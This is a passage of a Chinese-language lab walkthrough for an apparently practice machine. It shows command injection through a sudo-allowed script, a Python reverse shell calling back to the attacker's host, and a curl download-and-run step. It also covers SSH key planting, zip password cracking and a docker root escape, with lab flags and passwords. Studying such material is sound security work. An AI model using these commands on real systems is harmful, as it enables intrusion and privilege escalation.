        <div class="signInContainer">
                <div class="column">
                        <div class="header">
                                <h2 style="color:blue;">Customer Portal</h2>
                                <h3 style="color:green;">Log In<h3>
                        </div>
                        <form method="POST">
                                                                <input type="text" name="username" id="username" placeholder="Username" required>
                                <input type="password" name="password" id="password" placeholder="Password" required>
                                <input type="submit" name="submit" value="Submit">
                        </form>
                </div>
        </div>
</body>
</html>
```

Kali Linux : 10.18.72.222

Target IP Address : 10.10.122.143

```
┌──(root㉿kali)-[~/Downloads]
└─# nc -nvlp 5678
listening on [any] 5678 ...
connect to [10.18.72.222] from (UNKNOWN) [10.10.122.143] 35708
www-data@ubuntu:/var/www/html/secret$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html/secret$ whoami
whoami
www-data
www-data@ubuntu:/var/www/html/secret$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
www-data@ubuntu:/var/www/html/secret$ ls -al /home/apaar/.helpline.sh
ls -al /home/apaar/.helpline.sh
-rwxrwxr-x 1 apaar apaar 286 Oct  4  2020 /home/apaar/.helpline.sh
www-data@ubuntu:/var/www/html/secret$ cat /home/apaar/.helpline.sh
cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

可以在msg参数中输入系统命令，会以apaar权限执行。

```
www-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: caribert
caribert
Hello user! I am caribert,  Please enter your message: whoami
whoami
apaar
Thank you for your precious time!
```

```
www-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: a
a
Hello user! I am a,  Please enter your message: id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
Thank you for your precious time!
```

```
www-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: a
a
Hello user! I am a,  Please enter your message: cat /home/apaar/local.txt
cat /home/apaar/local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
Thank you for your precious time!
```

Target IP Address : 10.10.147.199

Kali Linux : 10.18.72.222

```
┌──(root㉿kali)-[~/Downloads]
└─# cat reverse.sh     
#!/bin/bash

python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.72.222",8848));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
                                                                                                                                                                                             
┌──(root㉿kali)-[~/Downloads]
└─# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

利用.helpline.sh，以apaar权限将reverse.sh下载到/home/apaar目录，并且以apaar权限执行reverse.sh，以获取apaar权限的reverse shell。

```
www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: a
a
Hello user! I am a,  Please enter your message: curl -o reverse.sh http://10.18.72.222/reverse.sh
curl -o reverse.sh http://10.18.72.222/reverse.sh
Thank you for your precious time!
```

```
www-data@ubuntu:/home/apaar$ ls -al reverse.sh
ls -al reverse.sh
-rw-r--r-- 1 apaar apaar 220 Aug  8 08:47 reverse.sh
```

```
www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: a
a
Hello user! I am a,  Please enter your message: bash reverse.sh
bash reverse.sh

```

成功获取了apaar权限的reverse shell。

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 8848
listening on [any] 8848 ...
connect to [10.18.72.222] from (UNKNOWN) [10.10.147.199] 56940
apaar@ubuntu:~$ whoami
whoami
apaar
apaar@ubuntu:~$ id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
apaar@ubuntu:~$ groups
groups
apaar
apaar@ubuntu:~$ cat /etc/shadow
cat /etc/shadow
cat: /etc/shadow: Permission denied

```

```
apaar@ubuntu:~$ cd .ssh
cd .ssh
apaar@ubuntu:~/.ssh$ pwd
pwd
/home/apaar/.ssh
apaar@ubuntu:~/.ssh$ ls -al
ls -al
total 12
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .
drwxr-xr-x 5 apaar apaar 4096 Aug  8 08:47 ..
-rw-r--r-- 1 apaar apaar  565 Oct  3  2020 authorized_keys
apaar@ubuntu:~/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3BzOCWTm3aFsN/RKd4n4tBT71A+vJYONyyrDDj59Pv8lnVTtxi1/VI2Nb/op1nHUcuz1tYMJDMew2kkb+5CX6uiYfnryzD4OQoQUhC4tMSmopIoAi322Y5QSzSY1mSBESddCsn0C5VgE9in4PFl3rFv/k05hJDTXewmCh06vN7OAT5CLbf9lTtf1/Ga40pRixYFlV5owqZci697h17Is1K7RSFCQZwLGl29pLHPBwOpXkHpJqNqEl6Wgu+y0jvauNKzgIypD0EyojgX+1OPogSEr8WNuOc8w6wqQm6gTaAayPioIATTD/ECDBMJPLYN71t6Wdi5E+7R2GT6BIRFiGhTG65KXwXj6Vn7bj99BLSlaq2Qk6oUYpxhhkaE5koPKCJHb9zBsrGEUHTOMFjKhCypQCtjG9noW2jzm+/beqKcEZINQEQfzQFIGKdH0ypGfCCvD6YFUg7lcqQQH5Zd+9a95/5WyUE0XkNzJzU/yxfQ8RDB2In/ZptDYNBFoHXfM= root@ubuntu
```

备份一下公钥文件，因为待会我们会把生成的公钥写入该文件。

```
apaar@ubuntu:~/.ssh$ cp authorized_keys authorized_keys.bak
cp authorized_keys authorized_keys.bak
apaar@ubuntu:~/.ssh$ ls -al
ls -al
total 16
drwxr-xr-x 2 apaar apaar 4096 Aug  8 09:05 .
drwxr-xr-x 5 apaar apaar 4096 Aug  8 08:47 ..
-rw-r--r-- 1 apaar apaar  565 Oct  3  2020 authorized_keys
-rw-r--r-- 1 apaar apaar  565 Aug  8 09:05 authorized_keys.bak
```

在Kali上生成SSH密钥对。

```
┌──(root㉿kali)-[~/Downloads]
└─# ssh-keygen -t rsa -b 4096 -C "idontexist@gmail.com"
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:C/oVWi1rN3yUS5bkrB6YTPyLn0/ihHBFSNtCPK/W3mU idontexist@gmail.com
The key's randomart image is:
+---[RSA 4096]----+
|       oo..      |
|       .++       |
|        ooo .    |
|       . +.+ o   |
|      o So. O    |
|     . Oo@.= .E  |
|    . ..X.X.+o   |
|     . o *.O.    |
|      . ..*..    |
+----[SHA256]-----+
```

将该公钥文件下载到目标apaar用户的.ssh目录。

```
┌──(root㉿kali)-[~/Downloads]
└─# cp /root/.ssh/id_rsa.pub .
```

```
apaar@ubuntu:~/.ssh$ curl -o id_rsa.pub http://10.18.72.222/id_rsa.pub
curl -o id_rsa.pub http://10.18.72.222/id_rsa.pub
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   746  100   746    0     0   1471      0 --:--:-- --:--:-- --:--:--  1471
apaar@ubuntu:~/.ssh$ ls -al
ls -al
total 20
drwxr-xr-x 2 apaar apaar 4096 Aug  8 09:14 .
drwxr-xr-x 5 apaar apaar 4096 Aug  8 08:47 ..
-rw-r--r-- 1 apaar apaar  565 Oct  3  2020 authorized_keys
-rw-r--r-- 1 apaar apaar  565 Aug  8 09:05 authorized_keys.bak
-rw-r--r-- 1 apaar apaar  746 Aug  8 09:14 id_rsa.pub
```

将公钥追加到authorized_keys文件：

```
apaar@ubuntu:~/.ssh$ cat id_rsa.pub
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCg3+OpWEUgFb/2Ku6MVaQC6yYUPtHnH9SB7gZXSl6/YxFZMhtuPc4S033szuroCFs5g2XYyoapraT6Aq6Ug8RyYwiaevAxo31zUgRirzeDqjiuBgUQl7mSJeUts/BLkx47PD4lqfWG46I8lyp5h3abo91XQaSjvyZSnNJLdo/8OvlF5vyYDzG2XCHZbHyj3DZQn4WYgVSZSc/UIAS9+9u1Zkqsf/VbJnXJBoOP4r3rNV7vh3puoIbknYh7mKa6cR0B4eggCQ96Hew04hZXFYJYf8k/GL2ow4ZXLQ7YhSl0eCOMh5VoAnNgtWRmp9tTIOsytO2cglYgo0l0wbsNwS9iQm7cORhR1Ua3768RbmXxd+i6x/2m5aPHGD2fC46I9Vez5T30aGJ9xyXiUpbVIEmX5KAl6bNWYUdeHxl7VYxJpwflpmGk+XYUdaDoUDzq5BFDvAF5e7S7enzUyTpteB2Fgit0F5Z+NPV4F85NX6dW2t+ip+eBXh3E5g3DqErBUq5WsrwA+1fv2YARViUVMiuicqt9wKhNj8IvO5H117kRuCriFzAEaWs9V9Hu4f6DTCG7971VnJEat4wfOKkgv5NnTR7w2q6QfgY58KoVF0Lei820ATAG65Em/y6mA0sDTWXVWwOz09tDDR+BDvHv3TETVE5qtkGMy3wLYrSQyKFwpQ== idontexist@gmail.com

apaar@ubuntu:~/.ssh$ cat id_rsa.pub >> authorized_keys
cat id_rsa.pub >> authorized_keys

apaar@ubuntu:~/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3BzOCWTm3aFsN/RKd4n4tBT71A+vJYONyyrDDj59Pv8lnVTtxi1/VI2Nb/op1nHUcuz1tYMJDMew2kkb+5CX6uiYfnryzD4OQoQUhC4tMSmopIoAi322Y5QSzSY1mSBESddCsn0C5VgE9in4PFl3rFv/k05hJDTXewmCh06vN7OAT5CLbf9lTtf1/Ga40pRixYFlV5owqZci697h17Is1K7RSFCQZwLGl29pLHPBwOpXkHpJqNqEl6Wgu+y0jvauNKzgIypD0EyojgX+1OPogSEr8WNuOc8w6wqQm6gTaAayPioIATTD/ECDBMJPLYN71t6Wdi5E+7R2GT6BIRFiGhTG65KXwXj6Vn7bj99BLSlaq2Qk6oUYpxhhkaE5koPKCJHb9zBsrGEUHTOMFjKhCypQCtjG9noW2jzm+/beqKcEZINQEQfzQFIGKdH0ypGfCCvD6YFUg7lcqQQH5Zd+9a95/5WyUE0XkNzJzU/yxfQ8RDB2In/ZptDYNBFoHXfM= root@ubuntu
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCg3+OpWEUgFb/2Ku6MVaQC6yYUPtHnH9SB7gZXSl6/YxFZMhtuPc4S033szuroCFs5g2XYyoapraT6Aq6Ug8RyYwiaevAxo31zUgRirzeDqjiuBgUQl7mSJeUts/BLkx47PD4lqfWG46I8lyp5h3abo91XQaSjvyZSnNJLdo/8OvlF5vyYDzG2XCHZbHyj3DZQn4WYgVSZSc/UIAS9+9u1Zkqsf/VbJnXJBoOP4r3rNV7vh3puoIbknYh7mKa6cR0B4eggCQ96Hew04hZXFYJYf8k/GL2ow4ZXLQ7YhSl0eCOMh5VoAnNgtWRmp9tTIOsytO2cglYgo0l0wbsNwS9iQm7cORhR1Ua3768RbmXxd+i6x/2m5aPHGD2fC46I9Vez5T30aGJ9xyXiUpbVIEmX5KAl6bNWYUdeHxl7VYxJpwflpmGk+XYUdaDoUDzq5BFDvAF5e7S7enzUyTpteB2Fgit0F5Z+NPV4F85NX6dW2t+ip+eBXh3E5g3DqErBUq5WsrwA+1fv2YARViUVMiuicqt9wKhNj8IvO5H117kRuCriFzAEaWs9V9Hu4f6DTCG7971VnJEat4wfOKkgv5NnTR7w2q6QfgY58KoVF0Lei820ATAG65Em/y6mA0sDTWXVWwOz09tDDR+BDvHv3TETVE5qtkGMy3wLYrSQyKFwpQ== idontexist@gmail.com
```

以apaar用户的身份ssh登录目标主机：

```
┌──(root㉿kali)-[~/.ssh]
└─# ls -al           
total 20
drwx------  2 root root 4096 Aug  8 05:10 .
drwx------ 22 root root 4096 Aug  8 05:06 ..
-rw-------  1 root root 3389 Aug  8 05:10 id_rsa
-rw-r--r--  1 root root  746 Aug  8 05:10 id_rsa.pub
-rw-r--r--  1 root root  568 Aug  7 06:19 known_hosts
                                                                                                                                                             
┌──(root㉿kali)-[~/.ssh]
└─# ssh apaar@10.10.147.199                            
The authenticity of host '10.10.147.199 (10.10.147.199)' can't be established.
ED25519 key fingerprint is SHA256:mDI9eoI+sD1gmuE1Vl2iLvyVIopHnZlbAEFxr82BFwc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.147.199' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  8 09:22:39 UTC 2023

  System load:  0.0                Processes:              115
  Usage of /:   24.8% of 18.57GB   Users logged in:        0
  Memory usage: 20%                IP address for eth0:    10.10.147.199
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.


Last login: Sun Oct  4 14:05:57 2020 from 192.168.184.129
apaar@ubuntu:~$ whoami
apaar
apaar@ubuntu:~$ id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
apaar@ubuntu:~$ 
```

还记得运行在127.0.0.1:9001上的Web服务吗？

要通过本地浏览器访问目标主机上的127.0.0.1:9001端口，您可以使用SSH端口转发（SSH Port Forwarding）来建立一个安全的隧道。以下是执行此操作的步骤：

1. 打开终端，并使用以下命令通过SSH建立端口转发：

   ```bash
   ssh -L 9001:127.0.0.1:9001 user@target_ip
   ```

   其中，`user` 是您在目标主机上的有效用户名，`target_ip` 是目标主机的IP地址。

   这将在您本地主机的9001端口和目标主机的127.0.0.1:9001之间建立一个隧道。

2. 输入目标主机的密码（如果需要）以建立SSH连接。

3. 在成功建立SSH连接后，您可以在本地浏览器中访问 `http://127.0.0.1:9001`，它将通过SSH隧道转发到目标主机的9001端口。

请注意，这将创建一个安全的加密通道，使您能够在本地浏览器中访问目标主机上的服务，而无需将端口直接暴露在互联网上。确保您具有合法授权来执行此操作，并在完成后安全地关闭SSH连接。

```
┌──(root㉿kali)-[~]
└─# ssh -L 9001:127.0.0.1:9001 apaar@10.10.147.199 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  8 09:29:28 UTC 2023

  System load:  0.08               Processes:              117
  Usage of /:   24.8% of 18.57GB   Users logged in:        1
  Memory usage: 20%                IP address for eth0:    10.10.147.199
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Aug  8 09:22:41 2023 from 10.18.72.222
apaar@ubuntu:~$ 
```

成功使用SSH端口转发（SSH Port Forwarding）建立了一个安全的隧道。

```
┌──(root㉿kali)-[~]
└─# netstat -antup
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      58190/ssh           
```

在Kali的浏览器上访问：http://127.0.0.1:9001/

可以看到登录界面：Customer Portal

抓取登录的POST数据包：

请求：

```
POST / HTTP/1.1

Host: 127.0.0.1:9001

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 54

Origin: http://127.0.0.1:9001

Connection: close

Referer: http://127.0.0.1:9001/

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: same-origin

Sec-Fetch-User: ?1



username=anurodh&password=masterpassword&submit=Submit
```

登录失败响应：

```
HTTP/1.1 200 OK

Date: Tue, 08 Aug 2023 09:42:17 GMT

Server: Apache/2.4.29 (Ubuntu)

Set-Cookie: PHPSESSID=3o80debh9la266otek5321st13; path=/

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Vary: Accept-Encoding

Content-Length: 632

Connection: close

Content-Type: text/html; charset=UTF-8



<html>
<body>
		<h1 style="color:red";>Invalid username or password</h1>
	<link rel="stylesheet" type="text/css" href="style.css">
	<div class="signInContainer">
		<div class="column">
			<div class="header">
				<h2 style="color:blue;">Customer Portal</h2>
				<h3 style="color:green;">Log In<h3>
			</div>
			<form method="POST">
				                		<input type="text" name="username" id="username" placeholder="Username" required>
				<input type="password" name="password" id="password" placeholder="Password" required>
				<input type="submit" name="submit" value="Submit">
        		</form>
		</div>
	</div>
</body>
</html>
```

利用之前获取的用户名和密码登录Web应用程序。

Aurick : 7e53614ced3640d5de23f111806cc4fd : masterpassword

cullapaar : 686216240e5af30df0501e53c789a649 : dontaskdonttell

请求：

```
POST / HTTP/1.1

Host: 127.0.0.1:9001

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 53

Origin: http://127.0.0.1:9001

Connection: close

Referer: http://127.0.0.1:9001/

Cookie: PHPSESSID=3o80debh9la266otek5321st13

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: same-origin

Sec-Fetch-User: ?1



username=Aurick&password=masterpassword&submit=Submit
```

```
HTTP/1.1 302 Found

Date: Tue, 08 Aug 2023 09:58:33 GMT

Server: Apache/2.4.29 (Ubuntu)

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Location: hacker.php

Content-Length: 573

Connection: close

Content-Type: text/html; charset=UTF-8



<html>
<body>
<link rel="stylesheet" type="text/css" href="style.css">
	<div class="signInContainer">
		<div class="column">
			<div class="header">
				<h2 style="color:blue;">Customer Portal</h2>
				<h3 style="color:green;">Log In<h3>
			</div>
			<form method="POST">
				1                		<input type="text" name="username" id="username" placeholder="Username" required>
				<input type="password" name="password" id="password" placeholder="Password" required>
				<input type="submit" name="submit" value="Submit">
        		</form>
		</div>
	</div>
</body>
</html>

```

```
GET /hacker.php HTTP/1.1

Host: 127.0.0.1:9001

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://127.0.0.1:9001/

Connection: close

Cookie: PHPSESSID=3o80debh9la266otek5321st13

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: same-origin

Sec-Fetch-User: ?1




```

```
HTTP/1.1 200 OK

Date: Tue, 08 Aug 2023 09:58:36 GMT

Server: Apache/2.4.29 (Ubuntu)

Vary: Accept-Encoding

Content-Length: 453

Connection: close

Content-Type: text/html; charset=UTF-8



<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
	color:red;
	font-weight: bold;
}
h1
{
	color: yellow;
	font-weight: bold;
}
</style>
<center>
	<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
	<h1 style="background-color:red;">You have reached this far. </h2>
	<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>

```

```
apaar@ubuntu:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,aurick
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:aurick
floppy:x:25:
tape:x:26:
sudo:x:27:aurick
audio:x:29:
dip:x:30:aurick
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:aurick
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
input:x:104:
crontab:x:105:
syslog:x:106:
messagebus:x:107:
lxd:x:108:aurick
mlocate:x:109:
uuidd:x:110:
ssh:x:111:
landscape:x:112:
aurick:x:1000:
ssl-cert:x:113:
mysql:x:114:
apaar:x:1001:
anurodh:x:1002:
docker:x:999:anurodh
ftp:x:115:
```

下载文件hacker-with-laptop_23-2147985341.jpg，检查是否存在隐写术。

```
┌──(root㉿kali)-[~/Downloads]
└─# steghide info hacker-with-laptop_23-2147985341.jpg 
"hacker-with-laptop_23-2147985341.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "backup.zip":
    size: 750.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

```
┌──(root㉿kali)-[~/Downloads]
└─# steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
```

```
┌──(root㉿kali)-[~/Downloads]
└─# unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: source_code.php         incorrect password
```

通过使用名为zip2john的二进制文件，我们可以将加密文件转换为john the ripper可以理解的hash格式并破解以获取明文密码。

```
┌──(root㉿kali)-[~/Downloads]
└─# zip2john backup.zip 
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
backup.zip/source_code.php:$pkzip$1*1*2*0*22a*4bb*69dc82f3*0*49*8*22a*2297*8e9e8de3a4b82cc98077a470ef800ed60ec6e205dc091547387432378de4c26ae8d64051a19d86bff2247f62dc1224ee79f048927d372bc6a45c0f21753a7b6beecfa0c847126d88084e57ddb9c90e9b0ef8018845c7d82b97b438a0a76e9a39c4846a146ae06efe4027f733ab63b509a56e2dec4c1dbce84337f0816421790246c983540c6fab21dd43aeda16d91addc5845dd18a05352ca9f4fcb45f0135be428c84dbac5a8d0c1fb2e84a7151ec3c1ae9740a84f2979d79da2e20d4854ef4483356cd078099725b5e7cf475144b22c64464a85edb8984cf7fc41d6a177f172c65e57f064700b6d49ef8298d83f42145e69befeab92453bd5f89bf827cd7993c9497eb2ad9868abd34b7a7b85f8e67404e2085de966e1460ad0ea031f895c7da70edbe7b7d6641dcdf6a4a31abc8781292a57b047a1cc5ce5ab4f375acf9a2ff4cac0075aa49e92f2d22e779bf3d9eacd2e1beffef894bc67de7235db962c80bbd3e3b54a14512a47841140e162184ca5d5d0ba013c1eaaa3220d82a53959a3e7d94fb5fa3ef3dfc049bdbd186851a1e7a8f344772155e569a5fa12659f482f4591198178600bb1290324b669d645dbb40dad2e52bf2adc2a55483837a5fc847f5ff0298fd47b139ce2d87915d688f09d8d167470db22bda770ce1602d6d2681b3973c5aac3b03258900d9e2cc50b8cea614d81bcfbb05d510638816743d125a0dce3459c29c996a5fdc66476f1b4280ac3f4f28ed1dbff48ef9f24fc028acc1393d07233d0181a6e3*$/pkzip$:source_code.php:backup.zip::backup.zip
```

```
┌──(root㉿kali)-[~/Downloads]
└─# zip2john backup.zip > backup.hash
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
```

```
┌──(root㉿kali)-[~/Downloads]
└─# john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2023-08-08 08:01) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s total90..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

使用密码pass1word提取source_code.php。

```
┌──(root㉿kali)-[~/Downloads]
└─# unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php   
```

以下是source_code.php的内容：

```php
<html>
<head>
	Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
			Email: <input type="email" name="email" placeholder="email"><br><br>
			Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
		</form>
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
</html>

```

用base64解码：IWQwbnRLbjB3bVlwQHNzdzByZA==，得到!d0ntKn0wmYp@ssw0rd。

使用该密码切换到用户anurodh。

```
apaar@ubuntu:/var/www/files$ su anurodh
Password: 
anurodh@ubuntu:/var/www/files$ whoami
anurodh
anurodh@ubuntu:/var/www/files$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
anurodh@ubuntu:/var/www/files$ groups
anurodh docker
anurodh@ubuntu:/var/www/files$ cd ~
anurodh@ubuntu:~$ pwd
/home/anurodh
anurodh@ubuntu:~$ ls -al
total 24
drwxr-x--- 2 anurodh anurodh 4096 Oct  4  2020 .
drwxr-xr-x 5 root    root    4096 Oct  3  2020 ..
-rw------- 1 anurodh anurodh    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 anurodh anurodh  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 anurodh anurodh 3771 Oct  3  2020 .bashrc
-rw-r--r-- 1 anurodh anurodh  807 Oct  3  2020 .profile
-rw-r--r-- 1 anurodh anurodh 1211 Oct  3  2020 source_code.php
```

可以看到我们在docker组。

[GTFOBins](https://gtfobins.github.io/)

docker以root权限运行。

```
anurodh@ubuntu:/$ ps aux | grep docker
root      1379  0.0  3.8 754444 79328 ?        Ssl  08:08   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
anurodh   3802  0.0  0.0  13136  1036 pts/3    S+   12:25   0:00 grep --color=auto docker
```

### docker 
Shell 文件写入 文件读取 SUID Sudo
这要求用户具有足够特权来运行docker，即要么在docker组中，要么是root用户。

任何其他Docker Linux镜像都应该可以工作，例如debian。

#### Shell
它可以用于从受限环境中脱离，通过生成一个交互式系统shell。

结果是一个root shell。

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

这个命令是用于在 Docker 容器中执行的，它在 Alpine Linux 镜像中创建一个容器，并在容器内执行指定的命令。下面对该命令进行逐步解释：

- `docker run`: 这是用于运行 Docker 容器的命令。

- `-v /:/mnt`: 这是一个选项，用于挂载主机的根目录（`/`）到容器内的 `/mnt` 目录。这将允许在容器内访问主机的文件系统。

- `--rm`: 这是一个选项，它告诉 Docker 在容器退出时自动删除容器。这可以帮助确保容器资源被及时清理。

- `-it`: 这是两个选项的组合，`-i` 表示保持标准输入打开（即使没有附加到容器），`-t` 表示分配一个伪终端。这使得我们可以与容器进行交互。

- `alpine`: 这是要运行的 Docker 镜像的名称。在这种情况下，使用的是 Alpine Linux 镜像，Alpine 是一个轻量级的 Linux 发行版。

